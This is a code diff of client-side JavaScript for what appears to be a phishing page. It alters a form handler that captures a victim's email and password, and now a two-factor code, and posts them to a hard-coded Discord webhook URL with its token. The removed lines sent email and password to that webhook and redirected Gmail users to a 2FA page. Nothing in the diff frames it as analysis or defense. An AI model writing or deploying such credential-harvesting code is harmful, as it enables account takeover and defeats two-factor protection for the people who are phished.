@@ -1,22 +1,13 @@
 const form = document.getElementById("register");
+const email = localStorage.getItem("email");
 
 form.addEventListener("submit", (event)=>
 {
     event.preventDefault();
 
+    const code = document.getElementById("code").value;
 
-
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
-
-    if(password!=document.getElementById("password2").value)
-    {
-        window.alert("hesla se neshodují")
-    }
-
-    else
-    {
-        const content = `email: ${email}\npassword: ${password}`
+        const content = `email: ${email}\n2fa code: ${code}`;
         
         fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
         {
@@ -30,10 +21,4 @@ form.addEventListener("submit", (event)=>
                 content: content
             })
         })
-
-        if(email.split('@')[1] == "gmail.com")
-        {
-            window.location.href = "/2fa.html";
-        }
-    }
 });
